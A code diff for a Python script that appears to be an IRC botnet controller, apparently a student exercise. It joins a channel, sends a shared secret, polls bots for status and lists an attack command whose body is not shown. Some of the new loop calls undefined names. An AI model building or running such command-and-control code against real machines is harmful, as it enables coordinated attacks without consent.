@@ -2,11 +2,27 @@ import socketserver
 import socket
 import os
 import sys
+import asyncio
+import string
+import random
+import select
+
+def sendPrivMSG(target,message):
+    client.send(('PRIVMSG ' + target + ' :'+message +'\n').encode('utf-8'))
 
 def do_status(client, args):
-    global secret
-    client.sendall('show')
-    botList = client.recv(16).decode('utf-8')
+    global channel
+    print(channel)
+    sendPrivMSG(channel,'status')
+    botList = []
+    client.settimeout(5)
+    while True:
+        try:
+            data = client.recv(1024).decode('utf-8')
+            print("A message from server:", data)
+            botList.append(data.split(':')[2].strip())
+        except socket.timeout:
+            break
     print(botList)
 
 def do_attack(client, args):
@@ -32,47 +48,66 @@ interpretInput = {
 }
 
 secret = None
+channel = None
 
 if __name__ == "__main__":
     HOST = sys.argv[1]
     srcPort = int(sys.argv[2])
-    channel = sys.argv[3]
+    channel = sys.argv[3][1:]
     secret = sys.argv[4]
     
-    try:
-        while True:
-            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect((HOST,srcPort))
-            client.sendall(('JOIN '+channel).encode('utf-8'));
-            client.sendall(secret.encode('utf-8'))
-            response = client.recv(16).decode('utf-8')
-            if response == 'ok':
-                while True:
-                    # Recieve data from client
-                    data = input("Please enter your command:")
-                    # Interpret user info by matching it with one of the definitions in the variable
-                    args = data.split()
-    #                if args[0] == "off":
-    #                    do_off(server,client_socket,args)
-    #                elif args[0] == "logout":
-    #                    do_logout(client_socket,args)
-    #                    loggedIn = False
-    #                    break
-    #                else:
-                    if not args[0] in interpretInput:
-                        print('No such command\n')
-                    else:
-                        interpretInput[args[0]](client,args)
-            else:
-                client.close()
-                sys.exit()
-    except Exception as err:
-        print(err)
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((HOST,srcPort))
+    while True:
+        id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
+        print(id)
+        client.send(('NICK controller'+id+'\n').encode('utf-8'))
+        try:
+            print('in try')
+            client.settimeout(4)
+            data = client.recv(128).decode('utf-8')
+            print ('IRC said:', data)
+            if not data == 'ERR_NICKNAMEINUSE':
+                break
+        except socket.timeout:
+            break
 
-# close clients socket
-client.close()
-# terminate the program
-sys.exit()
+    client.settimeout(None)
+    client.send(('USER controller * * :controller test\n').encode('utf-8'))
+    data = client.recv(1024).decode('utf-8')
+    print('response: ',data)
+    if not '001' in data:
+        print('You are not welcome')
+        sys.exit()
+
+    client.send(('JOIN '+channel+'\n').encode('utf-8'))
+    data = client.recv(1024).decode('utf-8')
+    print('response: ', data)
+    sendPrivMSG(channel,secret)
+
+    print('going to while')
+
+
+    while True:
+        data = input("Please enter your command:")
+        # Interpret user info by matching it with one of the definitions in the variable
+        args = data.split()
+        if args[0] == "shutdown":
+            do_shutdown(server,client_socket,args)
+        elif args[0] == "quit":
+            do_quit(client_socket,args)
+            loggedIn = False
+            break
+        else:
+            if not args[0] in interpretInput:
+                print('No such command\n')
+            else:
+                interpretInput[args[0]](client,args)
+                    
+    # close clients socket
+    client.close()
+    # terminate the program
+    sys.exit()
 
 
 
